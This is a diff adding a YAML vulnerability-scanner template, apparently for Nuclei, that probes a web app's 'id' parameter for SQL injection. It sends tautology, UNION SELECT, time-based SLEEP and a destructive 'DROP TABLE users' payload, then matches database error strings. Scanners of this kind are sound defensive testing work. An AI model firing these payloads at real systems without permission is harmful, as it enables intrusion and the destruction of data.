@@ -1,0 +1,39 @@
+id: sql-vulnerability-test
+info:
+  name: SQL Injection Vulnerability
+  description: Extensive test for SQL injection vulnerabilities in query parameters and form fields.
+  severity: Critical
+  author: Project
+  tags:
+    - sql
+    - injection
+    - critical
+    - database
+    - web
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1' OR '1'='1"
+      - "{{BaseURL}}?id=1'--"
+      - "{{BaseURL}}?id=1'/*"
+      - "{{BaseURL}}?id=1'; DROP TABLE users;--"
+      - "{{BaseURL}}?id=1' UNION SELECT NULL, NULL--"
+      - "{{BaseURL}}?id=1' AND SLEEP(5)--"
+      - "{{BaseURL}}?id=1' OR 'a'='a"
+      - "{{BaseURL}}?id=-1' UNION SELECT 1, @@version--"
+      - "{{BaseURL}}?id=1' AND '1'='2"
+    headers:
+      User-Agent: SQL-Injection-Scanner
+    matchers:
+      - type: word
+        words:
+          - SQL syntax error
+          - MySQL
+          - syntax error
+          - unclosed quotation mark
+          - Warning: mysql_fetch
+          - Unknown column
+          - database error
+        condition: or
+
